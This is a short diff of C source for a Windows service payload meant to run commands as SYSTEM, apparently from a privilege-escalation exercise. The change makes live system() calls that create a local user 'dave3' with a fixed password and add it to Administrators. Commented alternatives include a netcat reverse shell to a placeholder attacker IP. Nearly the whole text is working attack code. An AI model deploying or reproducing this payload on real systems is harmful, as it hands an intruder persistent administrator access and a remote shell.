@@ -12,15 +12,18 @@ void ControlHandler(DWORD request);
 //add the payload here
 int Run() 
 { 
-    // chnage the command to whatever you want to run as SYSTEM, for example, you can add a reverse shell here
-    // system("whoami > c:\\windows\\temp\\service.txt");
-    
-    // system("cmd.exe /k net localgroup administrators user /add");
-    
-    // or
+            // chnage the command to whatever you want to run as SYSTEM, for example, you can add a reverse shell here
+            
+            // 1. Add user to Administrators Group
+            // system("cmd.exe /k net localgroup administrators user /add");
 
-    // system("C:\Temp\nc.exe <Attacker IP> <PORT> -e cmd.exe");
-    
+            // 2. Create another user and add it to Administrators Group
+
+                system ("net user dave3 password123! /add");
+                system ("net localgroup administrators dave3 /add");
+
+            // 3. Use reverse shell
+            // system("C:\Temp\nc.exe <Attacker IP> <PORT> -e cmd.exe");
     return 0; 
 } 
 
